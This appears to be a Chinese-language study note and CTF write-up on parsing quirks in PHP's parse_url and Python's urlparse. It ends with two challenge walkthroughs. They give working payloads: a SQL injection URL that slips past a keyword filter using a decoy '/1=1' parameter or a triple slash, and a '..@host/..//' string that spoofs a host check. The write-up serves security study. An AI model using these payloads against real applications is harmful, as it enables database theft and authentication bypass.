### 端口解析tricks
```
<?php

$url = "/baidu.com:80";
$url1 = "/baidu.com:80a";
$url2 = "//pupiles.com/about:1234";
$url3 = "//baidu.com:80a";

var_dump(parse_url($url));
var_dump(parse_url($url1));
var_dump(parse_url($url2));
var_dump(parse_url($url3));
```

我们来看一下输出结果:

```
bool(false)
/home/lj/bin/php/bin/parse1.php:11:
array(1) {
  'path' =>
  string(14) "/baidu.com:80a"
}
/home/lj/bin/php/bin/parse1.php:12:
array(3) {
  'host' =>
  string(11) "pupiles.com"
  'port' =>
  int(1234)
  'path' =>
  string(11) "/about:1234"
}
/home/lj/bin/php/bin/parse1.php:13:
array(2) {
  'host' =>
  string(9) "baidu.com"
  'port' =>
  int(80)
}
```

第一种情况解析错误，但只要我们在端口后加一个字符，就又可以解析出path了


第二种情况我们在路径后面加上`:` 还是可以解析出端口号

第三种情况，说明对端口号做了intval类型转换。

我们可以看一下python 的urlparse解析出来的结果
```
ParseResult(scheme='', netloc='', path='/baidu.com:80', params='', query='', fragment='')
ParseResult(scheme='', netloc='', path='/baidu.com:80a', params='', query='', fragment='')
ParseResult(scheme='', netloc='pupiles.com', path='/about:1234', params='', query='', fragment='')
ParseResult(scheme='', netloc='baidu.com:80a', path='', params='', query='', fragment='')
```

## 路径解析tricks

```
$url4 = "//upload?/test/";
$url5 = "//upload?/1=1&id=1";
$url6 = "///upload?id=1";

var_dump(parse_url($url4));
var_dump(parse_url($url5));
var_dump(parse_url($url6));
```

php7输出结果为:
```
array(2) {
  'host' =>
  string(7) "upload?"
  'path' =>
  string(6) "/test/"
}
F:\sublime\php\audit\5\parse2.php:22:
array(2) {
  'host' =>
  string(7) "upload?"
  'path' =>
  string(9) "/1=1&id=1"
}
F:\sublime\php\audit\5\parse2.php:23:
bool(false)
```

1. `//upload?`如果是`//`, 则被解析成host, 后面的内容如果有`/`,会被解析出path，而不是query了。

这个trick可以用来添加混淆参数，从而可以保护好其他的参数。

2. 如果path部分为`///`，则解析错误，返回False



python 的urlparse解析也有这个问题
```
ParseResult(scheme='', netloc='', path='/upload', params='', query='/test/', fragment='')
ParseResult(scheme='', netloc='upload', path='', params='', query='/test/xx/', fragment='')
ParseResult(scheme='', netloc='upload', path='/test/', params='', query='', fragment='')
```

### host解析tricks



参考； http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html

另外，parse_url一般会用来解析$SERVER变量，其中的几个常用变量：
```
echo $_SERVER['REQUEST_URI']."<br/>";
echo $_SERVER['QUERY_STRING']."<br/>";
echo $_SERVER['HTTP_HOST']."<br/>";

#访问http://localhost:3000/php/audit/5/parse1.php?url=baidu.com#test
>>>
/php/audit/5/parse1.php?url=/baidu.com
url=/baidu.com
localhost:3000
```

可以看到REQUEST_URI 是path+query部分(不包含fragment)

QUERY_STRING: 主要是`key=value`部分

HTTP_HOST 是 `netloc+port` 部分。

更多的$_SERVER的值请查看:http://php.net/manual/zh/reserved.variables.server.php

### demo

demo1:
2016asisctf中的一题

```
<?php 
function waf(){
    $INFO = parse_url($_SERVER['REQUEST_URI']);
    var_dump($INFO);
    var_dump($_GET);
    parse_str($INFO['query'], $query);
    $filter = ["union", "select", "information_schema", "from"];
    foreach($query as $q){
        foreach($filter as $f){
            if (preg_match("/".$f."/i", $q)){ 
                die("attack detected!");
            }
        }
    }

    $sql = "select * from ctf where id='".$_GET['id']."'";
    var_dump($sql);
}
waf();
```

我们只需要传入: `http://localhost:83//parse3.php?/1=1&id=1%27%20union%20select%201,2,3%23`

这样，就可以绕过waf函数的绕过。

因为parse_url解析后的REQUEST_URI为:
```
array (size=2)
  'host' => string 'parse3.php?' (length=11)
  'path' => string '/1&id=1%27%20union%20select%201,2,3%23' (length=38)
```

但是我们的$_GET 的参数是可以获取到我们的两个参数:
```
array (size=2)
  '/1' => string '' (length=0)
  'id' => string '1' union select 1,2,3#' (length=22)
```

我们只要加一个混淆参数`/1=1` 就可以让parse_url的解析失败。

第二种绕过方式: `http://localhost:83///parse3.php?id=1%27%20union%20select%201,2,3%23` 

我们只需要在path加`///` 三斜杠，就会让parse_url解析失败，导致无法过滤参数。

### 网鼎杯第三场comein
```
<?php
ini_set("display_errors",0);
$uri = $_SERVER['REQUEST_URI'];
if(stripos($uri,".")){
    die("Unkonw URI.");
}
if(!parse_url($uri,PHP_URL_HOST)){
    $uri = "http://".$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'];
}
$host = parse_url($uri,PHP_URL_HOST);
var_dump(parse_url($uri));
if($host === "c7f.zhuque.com"){
    setcookie("AuthFlag","flag{*******}");
}
```

这里stripos 绕过只需要我们第一位是`.`即可。

重点是绕过parse_str函数。

payload: 

    ..@c7f.zhuque.com/..//index.php

![image](85991F83F52E467CBE72F74628ED7571)

我们来看一下parse_str解析出来的结果:

```
$url7 = "http://localhost..@c7f.zhuque.com/..//index.php";
var_dump(parse_url($url7));

>>>
array(4) {
  'scheme' =>
  string(4) "http"
  'host' =>
  string(14) "c7f.zhuque.com"
  'user' =>
  string(11) "localhost.."
  'path' =>
  string(14) "/..//index.php"
}
```

parse_str 把@前面的内容当作user:password 的认证信息了,从而解析出host为`c7f.zhuque.com`

这题我们没法在浏览器中直接访问payload, 因为浏览器的解析规则会认为`@`是一个重定向，从而调整到c7f.zhuque.com网站。

我们直接抓包来看一下apache的解析结果。

apache 成功解析出了`/index.php`的内容。而且必须是`..//` 才能解析出index.php

> 注意apache,浏览器，parse_uri的解析规则是不一样的，apache的解析规则就是按照请求包里面的host来解析的，但浏览器是按照[scheme]://[user:pass@]host:port/path?key=value#fragment` 这样来解析出来host,然后构造请求包的。 parse_url虽然是依照浏览器的要求来解析的，但也会出现一些问题。


参考； http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/